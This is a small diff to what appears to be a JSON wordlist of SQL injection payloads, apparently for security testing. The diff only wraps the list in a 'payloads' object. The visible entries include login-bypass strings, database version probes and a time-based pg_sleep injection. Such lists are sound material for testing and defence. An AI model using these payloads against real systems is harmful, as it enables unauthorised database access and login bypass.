@@ -1,4 +1,4 @@
-[
+{"payloads":[
 "' or 1=1 or '",
 "admin' --",
 "admin' #",
@@ -32,4 +32,4 @@
 "1%20and%20substring(version(),1,1)=5",
 "(substring(version(),1,1)=5)",
 "1';select pg_sleep(2); —"
-]
+]}
